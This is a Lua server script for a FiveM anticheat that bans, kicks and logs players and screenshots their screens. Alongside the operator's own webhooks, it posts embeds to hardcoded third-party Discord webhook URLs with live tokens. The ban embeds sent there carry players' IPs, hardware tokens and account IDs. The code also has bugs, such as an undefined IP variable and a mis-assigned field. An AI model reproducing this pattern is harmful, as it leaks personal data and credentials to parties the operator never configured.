local key = "hubsdfgsdbkjgbdmfgbdfgzfgdfg"
function ExtractIdentifiers(src)
    
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)
        
        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.sub(id, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(id, 9)
            identifiers.discord =  discordid
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end

    return identifiers
end

function PermCheck(source)
    local acsess = false
    
    if IsPlayerAceAllowed(source, 'SOON:BYPASS') then
        acsess = true
    end

    
    return acsess
end

local screenshots = {}
function matchURL(text_with_URLs)
    
    local domains = [[.ac.ad.ae.aero.af.ag.ai.al.am.an.ao.aq.ar.arpa.as.asia.at.au.aw.ax.az.ba.bb.bd.be.bf.bg.bh.bi.biz.bj.bm.bn.bo.br.bs.bt.bv.bw.by.bz.ca.cat.cc.cd.cf.cg.ch.ci.ck.cl.cm.cn.co.com.coop.cr.cs.cu.cv.cx.cy.cz.dd.de.dj.dk.dm.do.dz.ec.edu.ee.eg.eh.er.es.et.eu.fi.firm.fj.fk.fm.fo.fr.fx.ga.gb.gd.ge.gf.gh.gi.gl.gm.gn.gov.gp.gq.gr.gs.gt.gu.gw.gy.hk.hm.hn.hr.ht.hu.id.ie.il.im.in.info.int.io.iq.ir.is.it.je.jm.jo.jobs.jp.ke.kg.kh.ki.km.kn.kp.kr.kw.ky.kz.la.lb.lc.li.lk.lr.ls.lt.lu.lv.ly.ma.mc.md.me.mg.mh.mil.mk.ml.mm.mn.mo.mobi.mp.mq.mr.ms.mt.mu.museum.mv.mw.mx.my.mz.na.name.nato.nc.ne.net.nf.ng.ni.nl.no.nom.np.nr.nt.nu.nz.om.org.pa.pe.pf.pg.ph.pk.pl.pm.pn.post.pr.pro.ps.pt.pw.py.qa.re.ro.ru.rw.sa.sb.sc.sd.se.sg.sh.si.sj.sk.sl.sm.sn.so.sr.ss.st.store.su.sv.sy.sz.tc.td.tel.tf.tg.th.tj.tk.tl.tm.tn.to.tp.tr.travel.tt.tv.tw.tz.ua.ug.uk.um.us.uy.va.vc.ve.vg.vi.vn.vu.web.wf.ws.xxx.ye.yt.yu.za.zm.zr.zw]]
        
    local tlds = {}
    for tld in domains:gmatch'%w+' do
        tlds[tld] = true
    end
    local function max4(a,b,c,d) return math.max(a+0, b+0, c+0, d+0) end
    local protocols = {[''] = 0, ['http://'] = 0, ['https://'] = 0, ['ftp://'] = 0}
    local finished = {}
    
    for pos_start, url, prot, subd, tld, colon, port, slash, path in
    text_with_URLs:gmatch'()(([%w_.~!*:@&+$/?%%#-]-)(%w[-.%w]*%.)(%w+)(:?)(%d*)(/?)([%w_.~!*:@&+$/?%%#=-]*))'
    do
        if protocols[prot:lower()] == (1 - #slash) * #path and not subd:find'%W%W'
        and (colon == '' or port ~= '' and port + 0 < 65536)
        and (tlds[tld:lower()] or tld:find'^%d+$' and subd:find'^%d+%.%d+%.%d+%.$'
        and max4(tld, subd:match'^(%d+)%.(%d+)%.(%d+)%.$') < 256)
        then
            finished[pos_start] = true
            return url
        end
    end
    
    for pos_start, url, prot, dom, colon, port, slash, path in
    text_with_URLs:gmatch'()((%f[%w]%a+://)(%w[-.%w]*)(:?)(%d*)(/?)([%w_.~!*:@&+$/?%%#=-]*))'
    do
        if not finished[pos_start] and not (dom..'.'):find'%W%W'
        and protocols[prot:lower()] == (1 - #slash) * #path
        and (colon == '' or port ~= '' and port + 0 < 65536)
        then
            return url
        end
    end
end

RegisterServerEvent("TookScreenshot")
AddEventHandler("TookScreenshot", function(result)
    res = matchURL(tostring(result))
    screenshots[source] = res
end)

local bansInProgress = {}

function banPlayer(p, r)

    if not p then return end

    if isBanned(p) then return end

    if PermCheck(p) then return end

    if (bansInProgress[p]) then
        return
    end

    bansInProgress[p] = true

    local config = LoadResourceFile(GetCurrentResourceName(), "bans/banlist.json")
    local cfg = json.decode(config)
    
    local token = {}
    for i = 0, GetNumPlayerTokens(p) do
        table.insert(token, GetPlayerToken(p, i))
    end

    token = json.encode(token)
    
    TriggerClientEvent("Screen", p)

    Citizen.Wait(2100)

    img = screenshots[p]

    local ids = ExtractIdentifiers(p)
    local playerIP = ids.ip
    local playerSteam = ids.steam
    local playerLicense = ids.license
    local playerXbl = ids.xbl
    local playerLive = ids.live
    local playerDisc = ids.discord
    local banData = {}
    banData["ID"] = math.random(1111111,9999999)
    banData["ip"] = "NONE SUPPLIED"
    banData["token"] = token
    banData["img"] = img
    banData["reason"] = r
    banData["license"] = "NONE SUPPLIED"
    banData["steam"] = "NONE SUPPLIED"
    banData["xbl"] = "NONE SUPPLIED"
    banData["live"] = "NONE SUPPLIED"
    banData["discord"] = "NONE SUPPLIED"
    banData["date"] = os.date()
    if not img or img == nil then
        img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"
    end
    if ip ~= nil and ip ~= "nil" and ip ~= "" then 
        banData["ip"] = tostring(ip)
    end
    if playerLicense ~= nil and playerLicense ~= "nil" and playerLicense ~= "" then 
        banData["license"] = tostring(playerLicense)
    end
    if playerSteam ~= nil and playerSteam ~= "nil" and playerSteam ~= "" then 
        banData["steam"] = tostring(playerSteam)
    end
    if playerXbl ~= nil and playerXbl ~= "nil" and playerXbl ~= "" then 
        banData["xbl"] = tostring(playerXbl)
    end
    if playerLive ~= nil and playerLive ~= "nil" and playerLive ~= "" then 
        banData["live"] = tostring(playerXbl)
    end
    if playerDisc ~= nil and playerDisc ~= "nil" and playerDisc ~= "" then 
        banData["discord"] = tostring(playerDisc)
    end
    if playerIP == nil then playerIP = math.random(111111111,999999999) end
    if playerSteam == nil then playerSteam = math.random(111111111,999999999) end if playerLicense == nil then playerLicense = math.random(111111111,999999999) end
    if playerXbl == nil then playerXbl = math.random(111111111,999999999) end if playerLive == nil then playerLive = math.random(111111111,999999999) end if playerDisc == nil then playerDisc = math.random(111111111,999999999) end if token == nil then token = math.random(111111111,999999999) end
    cfg[tostring(GetPlayerName(p))] = banData
    SaveResourceFile(GetCurrentResourceName(), "bans/banlist.json", json.encode(cfg, { indent = true }), -1)

    if not img then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end
    if img == nil then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end
    if img == "NONE SUPPLIED" then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end

    local embed = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "New Detection...(Ban)",
                ["color"] = 15158332,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Server Name:", value = GetConvar('sv_hostname'), inline = false},
                    {name = "Discord:", value = " <@" ..playerDisc.. ">", inline = false},
                    {name = "Reason:", value = r, inline = false},
                    {name = "BAN-ID:", value = banData["ID"], inline = false},
                    {name = "HWID-Token:", value = token, inline = false},
                    {name = "IP:", value = playerIP, inline = false},
                    {name = "Steam:", value = playerSteam, inline = false},
                    {name = "License:", value = playerLicense, inline = false},
                    {name = "XBL:", value = playerXbl, inline = false},
                    {name = "Live:", value = playerLive, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Copyright © 2024 Soon Anticheat. All rights reserved",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                }
            }
        }
    }

    local embedpvt = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "Banned Player [Global]",
                ["color"] = 15158332,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Server Name:", value = GetConvar('sv_hostname'), inline = false},
                    {name = "Discord:", value = " <@" ..playerDisc.. ">", inline = false},
                    {name = "Reason:", value = r, inline = false},
                    {name = "BAN-ID:", value = banData["ID"], inline = false},
                    {name = "HWID-Token:", value = token, inline = false},
                    {name = "IP:", value = playerIP, inline = false},
                    {name = "Steam:", value = playerSteam, inline = false},
                    {name = "License:", value = playerLicense, inline = false},
                    {name = "XBL:", value = playerXbl, inline = false},
                    {name = "Live:", value = playerLive, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Copyright © 2024 Soon Anticheat. All rights reserved",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                }
            }
        }
    }

    local embed2 = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "Cheater Banned [Soonac]",
                ["color"] = 15158332,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Discord:", value = " <@" ..playerDisc.. ">", inline = false},
                    {name = "Reason:", value = r, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Banned From: " ..GetConvar('sv_hostname'),
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                }
            }
        }
    }

    local embedpublic3 = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "Cheater Banned [Soonac]",
                ["color"] = 15158332,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Discord:", value = " <@" ..playerDisc.. ">", inline = false},
                    {name = "Reason:", value = r, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Soon AntiCheat",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                }
            }
        }
    }

    PerformHttpRequest(webhookconfig.webhooks.ban, function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    PerformHttpRequest("https://discord.com/api/webhooks/1198335048726876240/80eWhLLfN8EEE5QXLO117oAPzRe8_jdT6JF5Mz4TLdIJvvpC84kypQQQZxLA8JCceEFW", function(Error, Content, Head) end, "POST", json.encode(embed2), {["Content-Type"] = "application/json"})
    PerformHttpRequest("https://discord.com/api/webhooks/1198335048726876240/80eWhLLfN8EEE5QXLO117oAPzRe8_jdT6JF5Mz4TLdIJvvpC84kypQQQZxLA8JCceEFW", function(Error, Content, Head) end, "POST", json.encode(embedpvt), {["Content-Type"] = "application/json"})
    PerformHttpRequest(webhookconfig.webhooks.publicban, function(Error, Content, Head) end, "POST", json.encode(embedpublic3), {["Content-Type"] = "application/json"})
    Wait(100)
    
    DropPlayer(p, "Soon AntiCheat - FiveM AntiCheat\n\n" ..serverconfig.Message.."\n\nBan ID: "..banData["ID"].."\n\nReason: " ..r)
    bansInProgress[p] = nil
end

function kickPlayer(p, r)

    if PermCheck(p) then return end

    local ids = ExtractIdentifiers(p)
    local playerIP = ids.ip
    local playerSteam = ids.steam
    local playerLicense = ids.license
    local playerXbl = ids.xbl
    local playerLive = ids.live
    local playerDisc = ids.discord

    Wait(1)

    TriggerClientEvent("Screen", p)

    Citizen.Wait(2000)

    img = screenshots[p]

    if not img then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end
    if img == nil then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end
    if img == "NONE SUPPLIED" then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end

    local embed = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "New Detection...(Kick)",
                ["color"] = 15105570,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Server Name:", value = GetConvar('sv_hostname'), inline = false},
                    {name = "Discord:", value = playerDisc.. " (<@" ..playerDisc.. ">)", inline = false},
                    {name = "Reason:", value = r, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Copyright © 2024 Soon Anticheat. All rights reserved",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                }
            }
        }
    }

    PerformHttpRequest(webhookconfig.webhooks.kick, function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    PerformHttpRequest("https://discord.com/api/webhooks/1198335048726876240/80eWhLLfN8EEE5QXLO117oAPzRe8_jdT6JF5Mz4TLdIJvvpC84kypQQQZxLA8JCceEFW", function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})

    Wait(100)

    DropPlayer(p, "Soon AntiCheat - FiveM AntiCheat\n\n" ..serverconfig.Message.."\n\nReason: " ..r)

end

function keylogPlayer(p, r)

    if PermCheck(p) then return end

    TriggerClientEvent("Screen", p)

    Citizen.Wait(2000)

    img = screenshots[p]

    local ids = ExtractIdentifiers(p)
    local playerIP = ids.ip
    local playerSteam = ids.steam
    local playerLicense = ids.license
    local playerXbl = ids.xbl
    local playerLive = ids.live
    local playerDisc = ids.discord

    local embed = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1198332570706911382/1198332633818599507/moon-shield.png?ex=65be853b&is=65ac103b&hm=9b6606c6c04e0190253d0cca0a51e703a0ef447519ec05358dcb4a5fc12ee038&"},
                ["title"] = "Blacklisted Key: " ..r,
                ["color"] = 3066993,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Server Name:", value = GetConvar('sv_hostname'), inline = false},
                    {name = "Discord:", value = playerDisc.. " (<@" ..playerDisc.. ">)", inline = false},
                    {name = "Reason:", value = "This Player has pressed " ..r, inline = false}
                },
                ["image"] = {
                    ["url"] = img,
                },
                ["footer"] = {
                    ["text"] = "Copyright © 2024 Soon Anticheat. All rights reserved",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                },
            }
        }
    }

    PerformHttpRequest(webhookconfig.webhooks.key, function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    PerformHttpRequest("https://discord.com/api/webhooks/1160348732764725298/3hCYmzmDvzhQOd60bPWmXwcw1xF7rG3FERU6goSa7j_FjWvwCmq-YFQ00wNDoVB-2apB", function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    
end

function logPlayer(p, r, t)

    if not t then t = "NONE SUPPLIED" end

    if PermCheck(p) then return end

    local ids = ExtractIdentifiers(p)
    local playerIP = ids.ip
    local playerSteam = ids.steam
    local playerLicense = ids.license
    local playerXbl = ids.xbl
    local playerLive = ids.live
    local playerDisc = ids.discord

    local embed = {
        username = "Soon AntiCheat",
        embeds = {
            {
                ["author"] = {name = "Soon ANTICHEAT", icon_url = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&"},
                ["title"] = "New Detection...(Warning) " ..r,
                ["color"] = 16705372,
                ["fields"] =  {
                    {name = "Player:", value = GetPlayerName(p), inline = false},
                    {name = "Server Name:", value = GetConvar('sv_hostname'), inline = false},
                    {name = "Discord:", value = playerDisc.. " (<@" ..playerDisc.. ">)", inline = false},
                    {name = "Reason:", value = r, inline = false}
                },
                ["footer"] = {
                    ["text"] = "Copyright © 2024 Soon Anticheat. All rights reserved",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&",
                },
            }
        }
    }

    PerformHttpRequest(webhookconfig.webhooks.warn, function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    PerformHttpRequest("https://discord.com/api/webhooks/1198335048726876240/80eWhLLfN8EEE5QXLO117oAPzRe8_jdT6JF5Mz4TLdIJvvpC84kypQQQZxLA8JCceEFW", function(Error, Content, Head) end, "POST", json.encode(embed), {["Content-Type"] = "application/json"})
    
end

function UnbanPlayer(banID)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans/banlist.json")
    local cfg = json.decode(config)
    for k, v in pairs(cfg) do 
        local id = tonumber(v["ID"])
        if id == tonumber(banID) then 
            local name = k
            cfg[k] = nil
            SaveResourceFile(GetCurrentResourceName(), "bans/banlist.json", json.encode(cfg, { indent = true }), -1)
            return name
        end
    end
    return false
end 

function isBanned(src)
    local config = LoadResourceFile(GetCurrentResourceName(), "bans/banlist.json")
    local cfg = json.decode(config)

    local token = {}
    for i = 0, GetNumPlayerTokens(src) do
        table.insert(token, GetPlayerToken(src, i))
    end

    token = json.encode(token)

    local ids = ExtractIdentifiers(src)
    local playerIP = ids.ip
    local token = GetPlayerToken(src)
    local playerSteam = ids.steam
    local playerLicense = ids.license
    local playerXbl = ids.xbl
    local playerLive = ids.live
    local playerDisc = ids.discord
    for k, v in pairs(cfg) do 
        local reason = v["reason"]
        local id = v["ID"]
        local img = v["img"]
        local ip = v["ip"]
        local token1 = v["token"]
        local license = v["license"]
        local steam = v["steam"]
        local xbl = v["xbl"]
        local live = v["live"]
        local discord = v["discord"]
        local date = v["date"]
        if tostring(ip) == tostring(playerIP) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(token) == tostring(token1) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(license) == tostring(playerLicense) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(steam) == tostring(playerSteam) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(xbl) == tostring(playerXbl) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(live) == tostring(playerLive) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img, ["date"] = date } end
        if tostring(discord) == tostring(playerDisc) then return { ["banID"] = id, ["reason"] = reason, ["img"] = img,  ["date"] = date} end
    end
    return false
end

function GetBans()
    local config = LoadResourceFile(GetCurrentResourceName(), "bans/banlist.json")
    local cfg = json.decode(config)
    return cfg
end

AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)

    local src = source
 
    deferrals.defer()
    Wait(2200)
    deferrals.update("Soon AntiCheat | Checking Banlist.json")

    local ids1 = GetPlayerIdentifiers(src)[1]
    local ids2 = GetPlayerIdentifiers(src)[2]
    local ids3 = GetPlayerIdentifiers(src)[3]
    local ids4 = GetPlayerIdentifiers(src)[4]
    local token = GetPlayerToken(src)

    if token == nil then token = "invalid" end if ids1 == nil then ids1 = "invalid" end if ids2 == nil then ids2 = "invalid" end if ids3 == nil then ids3 = "invalid" end if ids4 == nil then ids4 = "invalid" end
    
    Wait(80)

    if isBanned(src) then

        local img = isBanned(src)["img"]
        if not img or img == "NONE SUPPLIED" then img = "https://cdn.discordapp.com/attachments/1197631591279759391/1198591973217542195/soon-shield.png?ex=65bf76c3&is=65ad01c3&hm=2c64f9049342cd448ae33fea8c6bf2a56ac0a5d90593c2f006aaa28439b4f5ef&" end

        local date = isBanned(src)["date"]
        if not date or date == "NONE SUPPLIED" then date = "Could not fetch" end

        deferrals.presentCard({type = "AdaptiveCard",
        ["$schema"] = "http://adaptivecards.io/schemas/adaptive-card.json",
        version = "1.5",
        body = { {
          type = "Container",
          items = { {
            type = "TextBlock",
            wrap = true,
            text = "Soon ANTICHEAT",
            horizontalAlignment = "Center",
            size = "ExtraLarge"
          } }
        }, {
          type = "TextBlock",
          text = "You have been banned for cheating",
          wrap = true,
          horizontalAlignment = "Center",
          size = "Medium"
        }, {
          type = "Image",
          horizontalAlignment = "Center",
          url = img
        }, {
          type = "TextBlock",
          wrap = true,
          text = "Ban-ID: " ..isBanned(src)["banID"],
          size = "Default"
        }, {
            type = "TextBlock",
            wrap = true,
            text = "Banned at: " ..date,
            size = "Default"
          } }})

          Wait(600000)
          deferrals.done("\n🛡️ Soon AntiCheat | You have been banned from Soon AntiCheat\n\nYou will be added to the Global Ban List\nIf you think the ban is wrong, contact: discord.gg/Exoac")
          
    else
        deferrals.done()
    end

end)